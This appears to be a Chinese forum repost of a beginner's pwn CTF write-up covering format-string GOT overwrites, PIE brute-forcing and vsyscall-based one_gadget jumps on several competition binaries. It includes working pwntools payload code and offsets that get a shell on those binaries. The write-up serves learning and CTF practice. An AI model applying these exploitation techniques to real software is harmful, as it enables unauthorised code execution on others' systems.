> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-268715.htm)

> [原创] 新人 PWN 入坑总结 (三)

不多说接上文

格式化字符串 0x06
===========

一、MMA CTF 2nd 2016-greeting
---------------------------

1. 常规 checksec，开了 canary 和 NX。IDA 打开找漏洞，main 函数中格式化字符串漏洞：

```
#注释头
 
 
char v5; // [esp+5Ch] [ebp-44h]
char s; // [esp+1Ch] [ebp-84h]
-----------------------------------------------------
if ( !getnline(&v5, 64) )
sprintf(&s, "Nice to meet you, %s :)\n", &v5);
return printf(&s);

```

2. 再找 system，有导入，没有 binsh，没有 Libc。用格式化字符串修改某个函数的 got 表指向 system 函数，然后再次运行程序得以输入 binsh 传给该函数，相当于调用 system 函数，之后就可以 getshell。但是发现该程序中没有循环，修改之后没办法再次输入。

3. 这里需要用到 c 语言的结构执行：

![](https://bbs.pediy.com/upload/attach/202108/904686_P9GYVYYKF6KDB4S.jpg)

c 语言编译后，执行顺序如图所示，总的来说就是在 main 函数前会调用. init 段代码和. init_array 段的函数数组中每一个函数指针。同样的，main 函数结束后也会调用. fini 段代码和. fini._arrary 段的函数数组中的每一个函数指针。

4. 利用 Main 函数结束时会调用 fini 段的函数组这一个特点，我们尝试找到 fini 函数组的地址，利用格式化字符串漏洞来修改该地址，修改. fini_array 数组的第一个元素为 start，使得 Main 函数退出时运行该地址可以重复回到 start 来再次执行一次输入。

5.fini_array 段的地址直接 ctrl+s 就可以找到，内容是__do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux，保存的内容是一个地址，该地址对应是一个代码段，该代码段的函数名为__do_global_dtors_aux proc near。其它函数对应的 got,plt 可以通过 elf.pot\\elf.plt 对应的来搜索。

6. 但是这里存在一个问题，要将什么地址劫持为 system 函数？这个地址必须是在 getline 最后或者是之后，而且还需要有参数来执行 binsh。第一个想到的是 sprintf，因为该函数在 getline 函数之后，并且从右往左数第一个参数就是我们保存的内容，但是尝试过后发现崩溃了，修改是能修改，但是传参的时候有点问题。后面查看该函数汇编代码：

![](https://bbs.pediy.com/upload/attach/202108/904686_2PBWYTKKVHU6GQJ.jpg)

可以看到查看该函数从栈上取的第一个参数应该是 s 这个数组，而不是我们穿的 v5，而如果劫持为 system 函数，那么就要求栈上的 esp 指向的内容的地址是 binsh 字符串，但是这里确实指向 s 这个数组中的内容，为空，那么 system 函数就没办法调用成功了。后面又看 printf 函数，还是不行，因为这里 printf 函数的参数也是 s 这个数组，内容此时为空，无法顺利调用。之后再找，经过 getnline 函数内部可以发现有个 strlen 函数：

```
#注释头
 
#代码中的形式：
if ( !getnline(&v5, 64) )
----------------------------------------------------------------
getnline(char *s, int n)
return strlen(s);
 
#该函数原型：
unsigned int strlen(const char *str);
-------------------------------------------------------
#system函数原型：
int system(const char *command);

```

system 函数调用规则是需要一个地址，地址上保存的内容是 binsh 字符串，或者直接 "binsh" 字符串赋予，C 语言中就代表在全局变量中开辟一块内存，然后该内存保存的是 binsh 字符串，然后将该内存的地址赋予给 system 函数当作参数运行。总之就是 system 函数需要的参数是一个地址。

这里的 strlen 满足这个条件，虽然上面写的只是 s，但是 s 中保存的内容是一个地址，输入 AAAA，通过调试查看内容：

![](https://bbs.pediy.com/upload/attach/202108/904686_ZTEVEQTPX3TMEW7.jpg)

![](https://bbs.pediy.com/upload/attach/202108/904686_CKRFYMKBK2PEQ4S.jpg)

同样的，查看下汇编代码：

![](https://bbs.pediy.com/upload/attach/202108/904686_S2Y5M8E3FADSWGZ.jpg)

可以看到 [esp+s] 相当于是取 s 的栈地址赋值给 eax，然后 eax 赋值给 esp 栈顶，这两行破代码有病，一毛一样。所以现在跳转进 strlen 中的话，esp 的值也就是参数，是一个栈上地址，内容就是 AAAA。也就相当于在 strlen 中的 s 的值是一个地址，那么劫持后，就相当于 system(s)，同样可以 getshell。

▲劫持为 system 函数，要求原函数的参数也应该是一个地址才行，不然无法跳转。

7. 确定攻击思路后，开始计算偏移，先用 IDA 简单远程调试，输入 AAAA，然后将程序一直运行至 printf 处，可以看到栈中的偏移为 12.5 处会出现 A 的 ascii 值，也就是 41。由于我们需要栈中完整的对应地址，所以需要输入 aa 填充两个字节，来使得偏移量从 12.5 到 13 处，从而能够完整地输入我们需要修改的地址。

8. 之后编写 payload，这里使用控制字符 %hn(一次改动两个字节) 来修改：

payload = ‘aa’+p32(fini_array_addr+2) + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + str(格式化 fini+2) + str(格式化 fini) + str(格式化 strlen_got+2) + str(格式化 strlen_got)

9. 之后还得确定输出的值：

```
#注释头
 
fini_array = 0x08049934
start_addr = 0x080484f0
strlen_got = 0x08049a54
system_plt = 0x08048490

```

查看代码，由于 sprintf 的作用，printf 的参数 s 保存的不止有我们输入的，还有 Nice to meet you, 计算加上 aa 可得总共有 8f-7c+1=0x14 个，再加上三个 32 位的地址 12 字节，总共 32 字节，也就是 0x20。(计算截至为 str(格式化 fini+2) 处)

10. 另外由于. fini_array 的内容为 0x080485a0(按 d 可查看数据)，而我们需要更改的 start 地址为 0x080484f0，所以只需要改动大端序列中的 85a0 变成 84f0 即可。所以格式化. fini 中需要再输出的字节数应该是 0x84f0-0x20=0x84D0=34000。而 0x08049934+2 处的内容本身就是 0804，不需要修改。所以只需要修改. fini_array_addr 对应的内容即可，(.fini_array+2 对应的内容本身就是 0804，不用修改)。所以 payload 可以删去 p32(fini_array_addr+2) 和 str(格式化 fini+2)。

11. 接着计算，需要将 strlen_got+2 处的值改成 0804，由于之前已经输出了 0x84f0 所以需要用到数据截断。也就是格式化内容中需要再输出的字节数为 0x10804-0x84f0=0x8314=33556。

然后再计算 strlen_got 的值，需要再输出 0x18490-0x10804=0x7c8c=31884。

故都计算完毕，最后 payload 为：

payload = ‘aa’ + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + ’%34000c%12$hn’ + ‘%33556c%13$hn’ + ‘%31884c%14$hn’

12.payload 之后，运行完第一次的 printf 之后，程序会回到 start，之后需要再输入字符串 io.sendline('/bin/sh\x00') 来完整运行 system，从而 getshell。

二、Format_x86 和 format_x64
-------------------------

### ★32 位程序：

1. 常规 checksec，只开了 NX。打开 IDA 查漏洞，main 函数中格式化字符串漏洞：

```
#注释头
 
memset(&buf, 0, 0x12Cu);
read(0, &buf, 0x12Bu);
printf(&buf);

```

2. 这里会有一个重复读取的循环，开 shell 需要 system 函数和 binsh 字符串，这里只有 system 函数，got 和 plt 都对应有，没有 binsh 字符串，没有 libc。

3. 由于 printf 漏洞，我们可以利用这个漏洞向指定的内存地址写入指定的内容，这里考虑将 printf 的 got 中的值更改 system 函数 plt 表项的值。原本如果调用 printf 函数，则相当于执行 printf 函数的 got 表中保存的 printf 函数的真实地址处的代码，更改之后相当于执行 system 函数 plt 表地址处的代码，也就相当于调用 system 函数。原理如下：

原本执行 Printf 函数：相当于执行 printf 的执行代码

```
#注释头
 
printf_got_addr:   7Fxxxxxx
7Fxxxxxx:          printf的执行代码

```

更改之后：相当于执行 jmp system_got 代码，那就相当于执行 system 函数了

```
#注释头
 
printf_got_addr:          08048320(system_plt)
08048320(system_plt):     jmp system_got

```

4. 那么预想程序总流程如下：第一次读取，输入 payload，然后 printf 执行，将 printf 的 got 表更改为 system 函数 plt 表。通过 while 循环，第二次读取，输入 binsh 字符存入 buf 中，此时 printf(&buf)，相当于 system(&buf)，那就相当于 system(binsh)，即可直接 getshell。

5. 编写 payload，首先需要计算一下偏移地址，将断点下在 call printf 上，通过调试能够查看到 printf 写入栈中的地址距离 esp 的偏移量为 6，所以使用控制字符 %n 来将 printf 劫持到 system，这里偏移就会成 n-1 为 5。偏移代表的是取参数的时候的偏移量，下面的 payload 对应的 5，6，7，8 就对应向地址 print_got，print_got+1，print_got+2，print_got+3 写入内容。由于是修改地址，所以用 %hhn 来逐个修改，防止向服务器发送过大数据从而出错。

(1) 找到 got 表和 plt 表项的值

```
#注释头
 
printf_got = 0x08049778
system_plt = 0x08048320

```

(2)32 位程序，4 个字节一个地址，所以需要四个地址：

```
#注释头
 
payload = p32(printf_got)
payload += p32(printf_got+1)
payload += p32(printf_got+2)
payload += p32(printf_got+3)

```

(3) 由于是大端序，低地址保存的是高地址的内容，print_got 需要保存的应该是 system_plt 的最后一个字节，也就是 0x20。

①由于前面已经输入了 p32(printf_got)+p32(printf_got1)+p32(printf_got2)+p32(printf_got3)，这些在没有遇到 % 之前一定会被打印出来，共计 16 个字节，而我们需要让它总共打印出 0x20 个字节，所以我们再打印 (0x20-16) 个字节。

②同样，由于前面已经打印了 0x20 个字节，我们总共需要打印 0x83 个字节，所以应该再让程序打印 %(0x83-0x20) 个字节，之后道理相同。

```
#注释头
 
 
payload += "%"
payload += str(0x20-16)
payload += "c%5$hhn"
#写入0x20到地址print_got
 
payload += "%"
payload += str(0x83-0x20)
payload += "c%6$hhn"
#写入0x83到地址print_got+1
 
payload += "%"
payload += str(0x104-0x83)
payload += "c%7$hhn"
#写入0x04到地址print_got+2，0x104被截断为04
 
payload += "%"
payload += str(0x108-0x104)
payload += "c%8$hhn"
#写入0x08到地址print_got+3，0x108被截断为08

```

▲为了便于理解，下面代码也行：

```
#注释头
 
payload = p32(printf_got+1) 
#使用hhn写入，分别对应待写入的第3，4，2，1字节
payload += p32(printf_got)
payload += p32(printf_got+2)
payload += p32(printf_got+3)
 
payload += "%"
payload += str(0x83-16) #被写入的数据，注意四个地址长度是16，需要减掉
payload += "c%5$hhn"
 
payload += "%"
payload += str(0x120-0x83)
payload += "c%6$hhn"
 
payload += "%"
payload += str(0x204-0x120) #由于是hhn所以会被截断，只留后两位
payload += "c%7$hhn"
 
payload += "%"
payload += str(0x208-0x204)
payload += "c%8$hhn"

```

6. 其实可以直接使用类 Fmtstr，效果一样，将 Payload 替换成下列代码即可

payload = fmtstr_payload(5, {printf_got:system_plt})

7. 之后再 io.sendline('/bin/sh\x00')，即可 getshell

### ★64 位程序

1. 由于 64 位，传参的顺序为 rdi, rsi, rdx, rcx, r8, r9，接下来才是栈，所以偏移量应该是 6 指向栈顶。之后考虑使用 fmtstr 来直接构造获取：

payload = fmtstr_payload(6, {printf_got:system_plt})

但是这个方法会出错，因为在这种情况下，我们的地址如下

```
#注释头
 
printf_got = 0x00601020
system_plt = 0x00400460

```

需要写入地址 printf_got 的首两位是 00，且以 p64 形式发送，所以先发送的是 0x20，0x10，0x60，0x00，0x00....... 而 Read 函数读到 0x00 就会截断，默认这是字符串结束了，所以之后的都无效了。

2. 那么考虑手动方式，将 p64(printf_got) 放在 payload 的末尾，这样就只有最后才会读到 0x00，其它的有效数据都能读入。

3. 使用手动方式就需要再次计算偏移量，我们的 payload 构成应该是

payload = ”%”+str(system_plt)+”c%8$lln” + p64(printf_got)

这里偏移量为 8 是因为经过调试发现我们的输入从栈顶开始计算，也就是从栈顶开始，一共输入了

1(%) + 7(0x400460 转换成十进制为 4195424，也就是 7 个字节) + 7(“c%8$lln”) + 8(p64_printf_got)=23 个字节。

经过计算我们发现，p64 前面的字节数为 15 个字节，不足 8 的倍数，这样会导致 printf_got 的最后一个字节 20 被截断至偏移量为 7 的位置，从而使得偏移量为 8 的位置只有 6010，导致出错。所以我们需要填充一个字节进去，让它不会被截断。

![](https://bbs.pediy.com/upload/attach/202108/904686_R3TRQC6M99P9AKP.jpg)

```
#注释头
 
payload = ”a%” + str(system_plt-1)+”c%8$lln” + p64(printf_got)

```

加入一个字节 a 就可以使得在参数偏移量为 6 和 7 的位置中不会截断 0x601020。同时加入字节 a 就要使 system_plt-1 来满足最终打印的字符个数为 0x00400460，从而才能成功将 0x00400460(system_plt) 写入到 0x00601020(printf_got)

5. 完成 payload 之后，再次循环进入，输入 io.sendline('/bin/sh\x00') 后 interactive() 即可 getshell

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

爆破绕过 PIE0x07  

===============

一、BCTF 2017-100levels
---------------------

1. 常规 checksec，开启了 NX 和 PIE，不能 shellcode 和简单 rop。之后 IDA 打开找漏洞，E43 函数中存在栈溢出漏洞：

```
#注释头
 
__int64 buf; // [rsp+10h] [rbp-30h]
--------------------------------------------------
read(0, &buf, 0x400uLL);

```

有栈溢出那么首先想到是应该查看有没有后门，但是这个程序虽然外部引用了 system 函数，但是本身里并没有导入到. got.plt 表中，没办法直接通过. got.plt 来寻址。而且开了 PIE，就算导入到. got.plt 表中，也需要覆盖返回地址并且爆破倒数第四位才能跳转到 system 函数。虽然有栈溢出，但是没有后门函数，同样也没办法泄露 Libc 地址。

2. 想 getshell，又只有一个栈溢出，没有其它漏洞，还开了 PIE 和 NX，那么一定得泄露出地址才能做，而 printf 地址也因为 PIE 没办法直接跳转。陷入卡顿，但是这里可以查看 E43 函数中的 printf 的汇编代码：

只能通过栈溢出形式来为下一次的 printf 赋参数来泄露。又由于 PIE，也不知道任意一个函数的代码地址，那也没办法泄露被加载进入 Libc 中的内存地址。

3. 通过调试可以看到，进入 E43 函数中，抵达 printf 函数时，栈顶的上方有大量的指向 libc 的地址：

![](https://bbs.pediy.com/upload/attach/202108/904686_J76TCXJFBWEMAFF.jpg)

并且观察 E43 函数中的汇编代码，可以看到 Printf 是通过 rbp 取值的，那么我们可以通过栈溢出修改 rbp 来使得 [rbp+var_34] 落在其它地方，而如果这个其它地方有 libc 地址，那么就相当于泄露出了 Libc 地址。

![](https://bbs.pediy.com/upload/attach/202108/904686_CPQF38ZEQ5NJQZR.jpg)

4. 这个关卡数是由我们设置的，而且通过递归调用 E43 函数，形成多个 E43 的栈，那么进行调试，第二次进入 E43 的栈之后，仍然在运行到 printf 函数时，栈顶上方仍旧有大量的 Libc 地址。由于我们需要修改 rbp 来使得下一次的 printf 打印出 libc 地址，那么关卡最低需要设置两关，第一关用来栈溢出，修改 rbp，使得第二关中的 printf 函数指向栈顶上方从而打印出 Libc 地址。

5. 由于栈的随机化，我们如果随意修改 rbp 那么就会打印出奇怪的东西，所以修改 rbp 的最后一个字节，使得 [rbp+var_34] 能够移动一定范围，以一定几率命中栈顶上方。而又由于是递归调用，第一关的栈在第二关的栈的上方，模型大致如下：

(1) 第一次 rbp 和 rsp 以及第二次的如图：

![](https://bbs.pediy.com/upload/attach/202108/904686_47RPM4SD2FSZQKR.jpg)    ![](https://bbs.pediy.com/upload/attach/202108/904686_5RFYHKC7PB43PJY.jpg)

(2) 第一次栈以及第二次栈如图：

![](https://bbs.pediy.com/upload/attach/202108/904686_53RV472NM66CG2V.jpg)

![](https://bbs.pediy.com/upload/attach/202108/904686_J5T63KP9XAWRAN9.jpg)

▲这里用的是 Libc-2.32 的，用其他的 Libc 就不太一样，具体情况具体分析。

6. 这里的模型是假设第一次的 rsp 栈顶后两位为 00，但是由于栈地址随机化，所以 rsp 其实可以从 0x00-0xFF 之间变化，对应的地址也就是从 0-31 之间变化。

7. 这里先考虑第一个问题，rbp-var34 如何落到 libc 空间中，也就是当 0 往下移动，变化为大约是 4 或者 5 时，即可落到 libc 空间。同样的，从 5-16 变化，都可以使得 rbp-var34 落在 libc 空间。但是如果 0 变化成 16 以上，对应的第二次栈空间 rbp 就会变成 32 以上，换算成 16 进制为 0x100，这时修改最后两位，就会变成 0x15c，使得它不但不往上走，更会往下走，从而没办法落到 libc 空间。总而言之，慢慢研究下，然后计算概率大约为 12/32=3/8，可以使得落在 Libc 空间。这里的 5c 可以改变成其它值 x，但是需要 x-0x34 为 8 的倍数才行，不然取到的地址会是截断的，但是修改后成功概率会发生改变，因为 0x5c 扫到的地址范围大概就是 libc 的栈空间。

8. 落在 libc 空间不代表一定就会落在指向 Libc 地址上，前面可以看到，在 16 个地址范围内大概为 7 个，也就是 1/2 的概率成功。然后由于有 v2%a1 这个运算，也就对应汇编代码 idiv    [rbp+var_34]，这就导致如果 rbp+var_34 的数据为 0 那么就会产生除零操作，这里没办法去掉。需要进行 try 操作来去除这个错误，使程序重新运行，进行自动化爆破。同时泄露出来的地址会发现有时候是正数有时候是负数。这是因为我们只能泄露出地址的低 32 位，低 8 个十六进制数。而这个数的最高位可能是 0 或者 1，转换成有符号整数就可能是正负两种情况。这里进行处理可避免成功率下降：

```
#注释头
 
if addr_l8 < 0:
addr_l8 = addr_l8 + 0x100000000

```

9. 但是泄露出来的地址由于 printf 的参数是 %d，所以打印出来的是 32 位地址，还需要猜剩下 32 位。但是这里有个技巧，貌似所有 64 程序加载后的代码段地址都在 0x000055XXXXXXXXXX-0x000056XXXXXXXXXX 之间徘徊，对应的 libc 加载段在 0x00007EXXXXXXXXXX-0x00007FXXXXXXXXXX 范围，以下是测试数据：

程序开头段. load 首地址和 debug 段首地址：

```
#注释头
 
00007F1301D2A000  
000056238FCAB000
差值为28EF 7207 F000
 
00007FCB31061000
000055D513E06000
差值为29F6 1D25 B000
 
00007F58EFF09000
000055F7C1BEC000
差值为2983 DC10 3000

```

具体原理好像是 PIE 源代码随机的关系，但具体不太清楚，能用就行。所以高 32 位就可以假设地址为 0x00007fxx，所以这里需要爆破 0x1ff 大小，也就是 511，相当于 512 次，但是其实可以知道，大概率是落在 0x7f 里，看数据分析也可以知道，所以实际爆破次数基本在 500 次以内。所以将泄露出来的地址加上一个在 0x7f 里的值，也就是 addr = addr_l8 + 0x7f8b00000000，之后再根据 Libc 空间中指向 libc 地址的后两位来区分地址：并减去在 libc 中查到的偏移量即可得到 Libc 基地址。

```
#注释头
 
if hex(addr)[-2:] == '0b': #__IO_file_overflow+EB
libc_base = addr - 0x7c90b
 
elif hex(addr)[-2:] == 'd2': #puts+1B2
libc_base = addr - 0x70ad2
 
elif hex(addr)[-3:] == '600':#_IO_2_1_stdout_
libc_base = addr - 0x3c2600
 
elif hex(addr)[-3:] == '400':#_IO_file_jumps
libc_base = addr - 0x3be400
 
elif hex(addr)[-2:] == '83': #_IO_2_1_stdout_+83
libc_base = addr - 0x3c2683
 
elif hex(addr)[-2:] == '32': #_IO_do_write+C2
libc_base = addr - 0x7c370 - 0xc2
 
elif hex(addr)[-2:] == 'e7': #_IO_do_write+37
libc_base = addr - 0x7c370 - 0x37

```

所以算上命中概率，其实调试的时候可以看到，第一关的栈空间中由于程序运行结果也会有几个指向 Libc 地址，加上这几个也可以提高成功率，因为修改的 rbp 也是有可能落在第一关的栈空间。总的爆破次数应该就是 500/((1/2)*(3/8))，约为 2500 次，还能接受。

10. 泄露出 Libc 地址之后一般就有两种方法，一种是利用栈溢出，调用万能 gadget 用 system 函数进行 binsh 字符串赋值，从而 getshell。还有一种就是，利用 one_gadget 来 getshell，通过查看 E43 返回时的汇编代码有一个 move eax,0；满足 libc-2.23.so 的其中一个 one_gadget 的条件，那么直接用就行。

11. 最后 libc 基地址加上 one_gadget 的偏移地址就可以得到 one_gadget 的实际地址。

one_gadget = libc_base + 0x45526

之后在第二关中再次进行栈溢出覆盖 rip 来跳转到 one_gadget 即可 getshell。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

二、HITB GSEC CTF 2017-1000levels  

----------------------------------

1. 与之前 BCTF 2017-100levels 一模一样，只不过最大值变成了 1000 关，所以这里也同样可以用爆破来做，但是可以用另一种方法，vsyscall。

2. 进入 IDA 可以看到有一个 hint 函数，而且里面有 system 函数，但是很奇怪：

```
#注释头
 
sprintf((char *)&v1, "Hint: %p\n", &system, &system);

```

这个代码没怎么看懂，还是看下汇编代码：

![](https://bbs.pediy.com/upload/attach/202108/904686_S8F9FVWDQKFCZK3.jpg)

这里就是将 system 的地址赋值给 rax，然后 rax 给栈上的 [rbp+var_110] 赋值。之后也没有什么其它的更改栈上 [rbp+var_110] 的操作，所以进入 hint 函数之后，一定会将 system 函数放到栈上，通过调试也可以看出来。

3. 之后进入 go 函数，发现如果第一次输入负数，原本将关卡数赋值给 [rbp+var_110] 的操作就不会被执行，那么 [rbp+var_110] 上保存的仍然是 system 函数的地址。之后再输入关卡数，直接加到 [rbp+var_110] 上，那么如果第一次输入负数，第二次输入 system 函数和 one_gadget 的偏移，那么就变相将 [rbp+var_110] 上存放的内容保存为 one_gadget 的地址。

▲这里需要注意的是，[rbp+var_110]是在 hint 函数中被赋值的，而 go 函数中用到的也是 [rbp+var_110] 这个变量，但是不同函数栈肯定是不同的，所以这里两个 [rbp+var_110] 是不是一样的就值得思考一下。看程序可以发现，hint 函数和 go 函数都是在 main 函数中调用的，那么如果调用的时候两处的 rsp 是一样的就可以保证两个函数的 rbp 一样，也就代码 [rbp+var_110] 也是一样的。查看汇编代码：

![](https://bbs.pediy.com/upload/attach/202108/904686_VJ5MMJJZKK8DEW3.jpg)

可以看到从读取选项数据之后，到判断语句一直没有 push,pop 之类的操作，也就是说程序无论是运行到 hint 函数还是 go 函数时，main 函数栈的状态都是一样的，从而导致进入这两个函数中的栈底也都是同一个地址，那么 [rbp+var_110] 也就一样，所以用 hint 函数来为 [rbp+var_110] 赋值成 system 函数，再用 go 函数来为 [rbp+var_110] 赋值为 one_gadget 这条路是可以的，同样可以调试来确定一下。

4. 那么赋值之后进入 level 关卡函数，由于递归关系，最后一关的栈是和 go 函数的栈连在一起的，所以可以通过最后一关的栈溢出抵达 go 函数的栈，从而抵达 [rbp+var_110] 这个地址处。

5. 但是栈溢出只能修改数据，就算控制 eip，但是也并不知道 [rbp+var_110] 处的真实地址，只能通过调试来知道偏移是多少。所以这里需要用的 vsyscall 来将 rsp 下挪到 [rbp+var_110] 处从而执行 vsyscall 的 ret 操作来执行 [rbp+var_110] 处的代码，也就是 one_gadget。

6. 这里看一下 vsyscall 处的数据：

![](https://bbs.pediy.com/upload/attach/202108/904686_2E8Y4RMMW483VK8.jpg)

▲vsyscall 的特点：

(1) 某些版本存在，需要用到 gdb 来查看，IDA 中默认不可见。

(2) 地址不受到 ASLR 和 PIE 的影响，固定是 0xffffffffff600000-0xffffffffff601000。

(3) 不能从中间进入，只能从函数开头进入，意味着不能直接调用里面的 syscall。这里 vsyscall 分为三个函数，从上到下依次是

A.gettimeofday: 0xffffffffff600000

B.time: 0xffffffffff600400

C.getcpu: 0xffffffffff600800

(4)gettimeofday 函数执行成功时返回值就是 0，保存在 rax 寄存器中。这就为某些 one_gadget 创造了条件。

7. 观察代码可以发现，三个函数执行成功之后相当于一个 ret 操作，所以如果我们将 gettimeofday 放在 eip 处，那么就相当于放了一个 ret 操作上去，而 ret 操作又相当于 pop  eip，那么就相当于直接将 rsp 往下拉了一个单位。如果我们多次调用 gettimeofday，那么就可以将 rsp 下拉多个单位，从而抵达我们想要的地方来执行代码。那么这里就可以将 eip 改成 gettimeofday，然后在之后添加多个 gettimeofday 来滑到 one_gadget 来执行代码。

8. 所以现在就可以编写 exp 了

(1) 前置内容：

```
#注释头
 
libc_system_offset = 0x432C0                 
#减去system函数离libc开头的偏移
one_gadget_offset = 0x43158              
#加上one gadget rce离libc开头的偏移
vsyscall_gettimeofday = 0xffffffffff600000
 
io.recvuntil('Choice:')
io.sendline('2') #让system的地址进入栈中
io.recvuntil('Choice:')
io.sendline('1') #调用go()
io.recvuntil('How many levels?')
io.sendline('-1') #输入的值必须小于0，防止覆盖掉system的地址
io.recvuntil('Any more?')
io.sendline(str(one_gadget_offset-libc_system_offset))     
#第二次输入关卡的时候输入偏移值，从而通过相加将system的地址变为one gadget rce的地址

```

这里由于相加关系，levels=system_addr + one_gadget_offset - libc_system_offset, 肯定超过 999，所以关卡数一定是 1000 关。

(2) 开始循环答题，直至到达最后一关执行栈溢出：

```
#注释头
 
def answer():
    io.recvuntil('Question: ') 
    answer = eval(io.recvuntil(' = ')[:-3])
    io.recvuntil('Answer:')
    io.sendline(str(answer))
for i in range(999): #循环答题
    log.info(i)
    answer()

```

(3) 最后一关执行栈溢出，利用 gettimeofday 滑至 one_gadegt 从而 getshell。

```
#注释头
 
io.recvuntil('Question: ')
io.send(b'a'*0x38 + p64(vsyscall_gettimeofday)*3)
io.interactive()

```

▲以下是测试 [rbp+var_110] 的数据：

main 函数中的 rbp:    00007FFD3A854900

hint 函数中的 rbp:      00007FFD3A8548C0

go 函数中的 rbp:        00007FFD3A8548C0

▲vsyscall 用法:

vsyscall 直接进行 syscall，并没有利用栈空间，所以在处理栈溢出，但是由于 PIE 没有别的地址可以用时，而栈上又有某个有用的地址的时候，可以通过 vsyscall 构造一个 rop 链来 ret，每次 ret 都会消耗掉一个地址，将 rsp 下拉一个单位，这样就可以逐渐去贴近想要的那个地址，最后成功 ret 到相应的位置。

▲vdso 的特点：

(1)vdso 的地址随机化的，且其中的指令可以任意执行，不需要从入口开始。

(2) 相比于栈和其他的 ASLR，vdso 的随机化非常的弱，对于 32 的系统来说，有 1/256 的概率命中。

(3) 不同的内核随机程度不同：

A. 较旧版本：`0xf76d9000`-`0xf77ce000`

B. 较新版本：`0xf7ed0000`-`0xf7fd0000`

C. 其它版本：

可以编译以下文件之后用脚本查看：

```
//注释头
 
// compiled: gcc -g -m32 vdso_addr.c -o vdso_addr
#include  #include  #include  int main()
{
    printf("vdso addr: %124$p\n");//这里的偏移不同内核不一样，可调试一下看看。
    return 0;
} 
```

查看脚本：

```
#注释头
 
#!/usr/bin/python
# -*- coding:utf-8 -*-
 
import os
 
result = []
for i in range(100):
    result += [os.popen('./vdso_addr').read()[:-1]]
 
result = sorted(result)
 
for v in result:
    print (v)

```

▲vdso 的用法：与 vsystem 类似，泄露出地址后相当于有了 syscall。另外 32 位条件下有__kernel_rt_sigreturn，可以打 SROP。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

[https://xz.aliyun.com/t/5236](https://xz.aliyun.com/t/5236)

三、DefCamp CTF Finals 2016-SMS
-----------------------------

1. 常规 checksec 操作，开了 PIE 和 NX，首先 shellcode 不能用。其次 PIE 表示地址随机化，也就是没办法覆盖返回地址来直接跳转到我们想要的函数处。IDA 打开找漏洞，可以看到在 doms 函数中的 v1 的栈地址被传递给 set_user 和 set_sms

![](https://bbs.pediy.com/upload/attach/202108/904686_PJFMTUM95S5DVJV.jpg)

之后 set_user 中会读取输入保存在 S 这个栈地址上，然后从 s 中读取前四十个字节到 a1[140]-a1[180]，这个 a1 就是 doms 函数中的 v1。

![](https://bbs.pediy.com/upload/attach/202108/904686_D3GDUTQPJE8HBHE.jpg)

再往后看，在 set_sms 函数中，同样读取 1024 个字节到 S 这个栈变量中，并且最后将 S 的特定长度 strncpy 给 a1，这个特定长度就是 a1[180]。所以这里我们可以通过 set_user 来控制 a1[180]，进而控制 set_sms 函数中 strncpy 给 a1 拷贝的长度，也就是 doms 函数中 v1 的长度，使其大于 v1 距离栈底的距离 0xc0，从而在 doms 函数栈中执行栈溢出，而 doms 函数中的 v1 也就是 a1，是在 set_sms 中由我们输入到 S 上的内容拷贝过去的，长度为 0x400，完全可控。

![](https://bbs.pediy.com/upload/attach/202108/904686_5EFYBNVF5J7E7F2.jpg)

另外程序存在后门 frontdoor()，只要进入这个函数，再输入 binsh 字符串就能 getshell。

2. 所以现存在 doms 函数栈溢出，后门函数这两个漏洞，但是由于 PIE，在程序运行过程中没办法确定 frontdoor() 的地址，无法直接覆盖 doms 函数返回地址到达后门函数

3. 这里就需要用到内存页的一个知识点，由于一个内存页的大小为 0x1000，而 frontdoor() 函数和 dosms 函数和 main 函数等等函数，都在同一个内存页上，所以在 64 位程序下他们的函数地址都是 0x############x*** 这种类型，前面 12 位 #每次加载都不一样，而后面的三位 *** 不会发生改变，因为都在 0x0000563cc913(x)000 - 0x0000563cc913(x+1)000 这个内存页上。用 IDA 打开按 ctrl+s 可以看到

![](https://bbs.pediy.com/upload/attach/202108/904686_25TR253GDK7G2BG.jpg)

这些段都在 0x0000563cc913(x)000 - 0x0000563cc913(x+1)000 这个内存页上。而开启了 PIE 程序的，0000563cc913(x) 这个数值每次都会变化，但是最后三位是不会改变的，就是固定相对于这个内存页起始位置的偏移。

4. 所以覆盖返回地址时，可以想到，dosms 函数的返回地址是 call dosms 下一条指令，也就是在 main 函数上，而 frontdoor 函数的地址与 main 函数的地址都在 0x0000563cc913(x) 这个内存页上。所以当程序被加载，0x0000563cc913(x) 这个数值发生改变时，frontdoor 函数和 main 函数地址中对应的数值也会相应改变，而且都是一样的。这种情况下，就可以通过修改 dosms 返回地址的后四位，也就是之前的 (x)yyy 来跳转到 frontdoor。

5. 如果直接爆破，按照数学期望需要尝试 0xffff+1=65535+1 这么多次，太巨大。这里又考虑到 yyy 时不会改变的，所以用 IDA 可以看到 frontdoor 函数的后三位地址为 900，我们在写 payload 的时候直接写入即可，就是 PIE 也不会发生改变。现在唯一不确定的就是 (x)yyy 中的 x。直接爆破就好，平均尝试的数学期望为 f+1=16 次，也不算太高。

6. 所以尝试写 payload:

(1) 修改 set_user 中的 a1[180] 的值：

```
#注释头
 
def setlength():
    io.recvuntil('> ')
    payload_setlength = 'a'*40 #padding
    payload_setlength += '\xca' 
    io.sendline(payload_setlength)

```

(2) 执行栈溢出，覆盖返回地址的低两个字节为 "\x(x)9" 和 "\x01"(大端序，注意顺序)

```
#注释头
 
def StackOverflow():
    io.recvuntil('> ')
    payload_StackOverflow = 'a'*200 #padding
    payload_StackOverflow += '\x01\xa9' 
    #frontdoor的地址后三位是0x900, +1跳过push rbp，影响
    io.sendline(payload_StackOverflow)

```

